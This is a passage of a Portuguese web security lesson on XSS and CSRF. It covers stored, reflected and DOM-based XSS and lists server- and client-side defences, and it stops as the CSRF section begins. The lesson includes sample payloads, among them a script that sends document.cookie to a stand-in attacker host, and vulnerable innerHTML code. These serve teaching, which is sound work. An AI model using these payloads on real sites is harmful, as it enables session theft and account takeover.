Duas das vulnerabilidades mais exploradas em aplicações web. Embora frequentemente mencionadas em conjunto, são fundamentalmente diferentes na sua natureza, no seu vetor de ataque e nas suas contramedidas. Nesta aula, dissecamos cada uma com exemplos concretos e estratégias de defesa.

01 — Enquadramento

Duas ameaças, duas naturezas

XSS (Cross-Site Scripting) e CSRF (Cross-Site Request Forgery) são vulnerabilidades distintas, mas partilham um elemento comum: ambas exploram a confiança entre o utilizador, o navegador e a aplicação web. Compreender a diferença é essencial para as combater corretamente.

3 Tipos principais de XSS
💉

XSS

Cross-Site Scripting
  • Injeção de código JavaScript malicioso numa página web.
  • O código corre no navegador da vítima, no contexto da aplicação vulnerável.
  • Explora a confiança que o utilizador tem no site.
  • Objetivo típico: roubar cookies de sessão, credenciais, ou manipular o DOM.
🎭

CSRF

Cross-Site Request Forgery
  • Forçar o navegador da vítima a enviar um pedido autenticado a um site vulnerável.
  • O pedido é enviado com as credenciais da vítima (cookies de sessão).
  • Explora a confiança que o site tem no navegador do utilizador.
  • Objetivo típico: executar ações não autorizadas em nome da vítima.
ℹ️
A analogia do crachá

Pense num edifício com controlo de acesso por crachá. XSS é como alguém que se disfarça de funcionário e convence o segurança a deixá-lo entrar — o atacante está dentro do sistema, a agir como se fosse legítimo. CSRF é como alguém que agarra no crachá de um funcionário distraído e o usa para abrir portas — o atacante não está no edifício, mas usa as credenciais de quem está.

02 — Cross-Site Scripting

XSS em detalhe

O XSS ocorre quando uma aplicação inclui dados não confiáveis numa página sem validação ou escape adequado. O navegador interpreta esses dados como código, executando-o no contexto da aplicação.

Atacante injeta script
→
Aplicação armazena ou reflete
→
Vítima visita a página
→
Script executa no navegador

Os três tipos de XSS essencial

01

XSS Armazenado (Stored / Persistente)

O código malicioso é armazenado permanentemente no servidor — numa base de dados, fórum, comentário ou perfil. Cada vez que a página é carregada, o script é executado para todos os utilizadores que a visitam. É o tipo mais perigoso porque não requer interação direta com o atacante.

// Exemplo: campo de comentário vulnerável // O atacante submete este comentário: <script>fetch('https://atacante.pt/roubar?c='+document.cookie)</script> // O servidor armazena e devolve o comentário sem escape // Todos os visitantes executam o script e enviam o cookie para o atacante
02

XSS Refletido (Reflected / Não Persistente)

O código malicioso é refletido pela aplicação na resposta imediata, sem ser armazenado. O atacante envia um link manipulado à vítima; quando esta clica, o script é executado. Requer engenharia social (convencer a vítima a clicar no link).

// URL legítima: https://exemplo.pt/pesquisa?q=seguranca // URL manipulada pelo atacante: https://exemplo.pt/pesquisa?q=<script>alert(document.cookie)</script> // Se a aplicação refletir 'q' sem escape no HTML: <p>Resultados para: <script>alert(document.cookie)</script></p>
03

XSS Baseado em DOM (DOM-based)

O código malicioso nunca passa pelo servidor. A vulnerabilidade está no JavaScript do lado do cliente, que lê dados de uma fonte controlável (URL, localStorage) e os insere no DOM de forma insegura. O servidor devolve sempre a mesma página; a manipulação ocorre inteiramente no navegador.

// Código vulnerável no cliente: const nome = new URLSearchParams(location.search).get('nome'); document.getElementById('saudacao').innerHTML = 'Olá, ' + nome; // URL manipulada: https://exemplo.pt/?nome=<img src=x onerror=alert(1)> // O innerHTML interpreta a string como HTML → executa onerror // O servidor nunca viu o payload — a falha é 100% no cliente
🚨
Porque é que o XSS é tão grave?

O JavaScript executado corre no mesmo contexto de origem que a aplicação. Isso significa que pode: ler e modificar o DOM, aceder a cookies não HttpOnly, ler o localStorage, fazer pedidos autenticados em nome do utilizador, capturar teclas digitadas em formulários, redirecionar para sites falsos de phishing, e por aí adiante. Em essência, o atacante ganha os mesmos poderes que a aplicação tem sobre o navegador da vítima.

Como prevenir XSS contramedidas

🛡️

Defesas no servidor

  • Escapar output conforme o contexto: HTML, atributos, JavaScript, CSS, URLs — cada contexto tem regras próprias.
  • Validar input: listas de permissões para dados estruturados (números, emails, datas).
  • Usar frameworks com auto-escape: React, Vue, Angular escapam por omissão.
  • Cabeçalho Content-Security-Policy (CSP): restringe fontes de scripts permitidas.
  • Cookie HttpOnly: impede acesso a cookies via JavaScript.
💻

Defesas no cliente

  • Evitar innerHTML com dados não confiáveis: usar textContent ou createElement.
  • Sanitizar HTML quando necessário: usar bibliotecas como DOMPurify.
  • Não usar eval, Function, setTimeout com strings.
  • Validar dados de fontes controláveis: URL, postMessage, localStorage.
  • CSP com nonce ou hash: bloquear scripts inline não autorizados.
// ❌ Vulnerável elemento.innerHTML = inputDoUtilizador; // ✅ Seguro — texto puro elemento.textContent = inputDoUtilizador; // ✅ Seguro — criar elementos programaticamente const p = document.createElement('p'); p.textContent = inputDoUtilizador; elemento.appendChild(p); // ✅ Sanitizar HTML quando é realmente necessário renderizar HTML import DOMPurify from 'dompurify'; elemento.innerHTML = DOMPurify.sanitize(inputDoUtilizador);
03 — Cross-Site Request Forgery

CSRF em detalhe

O CSRF força o navegador de uma vítima autenticada a enviar um pedido não intencional a uma aplicação web. A aplicação não distingue o pedido legítimo do forjado, porque o navegador envia automaticamente as credenciais de sessão.

→
